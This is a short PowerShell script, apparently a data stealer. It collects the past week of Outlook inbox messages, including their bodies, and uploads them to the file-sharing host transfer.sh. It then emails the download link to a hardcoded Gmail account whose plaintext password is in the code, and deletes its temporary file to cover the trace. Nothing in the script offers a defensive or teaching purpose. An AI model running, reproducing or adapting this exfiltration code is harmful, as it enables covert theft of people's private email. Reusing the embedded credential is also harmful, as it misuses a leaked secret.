$startDate = (Get-Date).AddDays(-7)
$tmpFile = "$env:TEMP\levek.txt"


$Outlook = New-Object -ComObject Outlook.Application
$Namespace = $Outlook.GetNamespace("MAPI")
$Inbox = $Namespace.GetDefaultFolder(6) # 6 = Inbox
$Items = $Inbox.Items | Where-Object { $_.ReceivedTime -gt $startDate }


$Items | ForEach-Object {
    "Subject: $($_.Subject)`nFrom: $($_.SenderName)`nDate: $($_.ReceivedTime)`nBody:`n$($_.Body)`n`n---`n"
} | Set-Content -Path $tmpFile


$response = Invoke-RestMethod -Uri "https://transfer.sh/levek.txt" -Method Put -InFile $tmpFile
$link = $response.Content


$EmailUser = "uvbnfckd@gmail.com"
$EmailPass = ConvertTo-SecureString "Q2k5svx7Yxx!" -AsPlainText -Force
$Creds = New-Object System.Management.Automation.PSCredential($EmailUser, $EmailPass)
Send-MailMessage -From $EmailUser -To "uvbnfckd@gmail.com" -Subject "Outlook Levelek" -Body "Letöltési link: $link" -SmtpServer "smtp.gmail.com" -Port 587 -UseSsl -Credential $Creds


Remove-Item $tmpFile -Force
